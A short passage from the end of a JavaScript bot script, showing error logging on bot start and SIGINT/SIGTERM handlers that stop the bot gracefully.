        .catch(err => console.error('Bot start error:', err));
    
    // Enable graceful stop
    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));